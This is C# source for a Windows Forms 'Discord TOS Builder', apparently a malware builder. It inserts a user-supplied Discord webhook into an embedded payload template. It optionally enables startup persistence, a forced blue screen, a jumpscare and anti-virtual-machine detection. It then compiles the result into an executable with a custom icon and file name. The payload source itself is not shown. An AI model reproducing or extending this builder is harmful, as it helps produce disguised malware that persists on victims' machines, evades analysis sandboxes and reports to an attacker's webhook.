using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Discord_TOS_Builder
{
    public partial class Form1 : Form
    {
        string src = Properties.Resources.Program;


        public Form1()
        {
            InitializeComponent();
        }

        private void label4_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void label5_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            border1.Visible = true;
            border2.Visible = true;
            Home.Visible = true;
            Options.Visible = false;
            fun.Visible = false;
            Compile.Visible = false;



        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            border1.Visible = true;
            border2.Visible = true;
            Home.Visible = false;
            Options.Visible = true;
            fun.Visible = false;
            Compile.Visible = false;
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            border1.Visible = true;
            border2.Visible = true;
            Home.Visible = false;
            Options.Visible = false;
            fun.Visible = true;
            Compile.Visible = false;
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            border1.Visible = true;
            border2.Visible = true;
            Home.Visible = false;
            Options.Visible = false;
            fun.Visible = false;
            Compile.Visible = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            border1.Visible = true;
            border2.Visible = true;
            Home.Visible = true;
            Options.Visible = false;
            fun.Visible = false;
            Compile.Visible = false;
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            Process.Start("");
        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {
            {
                logs.Text = logs.Text + Environment.NewLine + "Attempting to compile file..";
                Console.WriteLine("Webhook: " + webhook.Text);
                src = src.Replace("%INSERT_WEBHOOK%", webhook.Text);

                if (!guna2CustomCheckBox1.Checked)
                {
                    src = src.Replace("%JUMP%", "");
                }
                if (!guna2CustomCheckBox2.Checked)
                {
                    src = src.Replace("%STARTUP%", "");
                }
                if (!guna2CustomCheckBox3.Checked)
                {
                    src = src.Replace("%BSOD%", "");
                }
                if (!guna2CustomCheckBox4.Checked)
                {
                    src = src.Replace("%ANTIVM%", "");
                }


                Console.WriteLine(src);
                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                ICodeCompiler icc = codeProvider.CreateCompiler();

                string output = "output.exe";
                if (!String.IsNullOrEmpty(guna2TextBox1.Text))
                {
                    output = guna2TextBox1.Text + ".exe";
                }
                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = output;

                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Drawing.dll");
                parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                parameters.ReferencedAssemblies.Add("mscorlib.dll");

                if (!String.IsNullOrEmpty(Icon.Text))
                {
                    parameters.CompilerOptions = @"/win32icon:" + "\"" + Icon.Text + "\"";
                }
                CompilerResults results = icc.CompileAssemblyFromSource(parameters, src);
                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError CompErr in results.Errors)
                    {
                        logs.Text = logs.Text + Environment.NewLine +
                                    "Line number " + CompErr.Line +
                                    ", Error Number: " + CompErr.ErrorNumber +
                                    ", '" + CompErr.ErrorText + ";";
                    }
                    logs.Text = logs.Text + Environment.NewLine + "An error has occured when trying to compile file.";
                }
                else
                {
                    logs.Text = logs.Text + Environment.NewLine + "Successfully compiled file!" + Environment.NewLine + "Task has been completed. You may now check the folder where this application is located for the output.";
                }


            }
        }

        private void guna2CustomCheckBox1_Click(object sender, EventArgs e)
        {
            src = src.Replace("%JUMP%", "jumpscare();");
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "ico file (*.ico)|*.ico";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    Icon.Text = x.FileName;
                }
                else
                {
                    Icon.Clear();
                }
            }
        }

        private void guna2CustomCheckBox2_Click(object sender, EventArgs e)
        {
            src = src.Replace("%STARTUP%", "startup();");
        }

        private void guna2CustomCheckBox3_Click(object sender, EventArgs e)
        {
            src = src.Replace("%BSOD%", "bsod();");
        }

        private void guna2CustomCheckBox4_Click(object sender, EventArgs e)
        {
            src = src.Replace("%ANTIVM%", "DetectRegistry();");
        }
    }
}
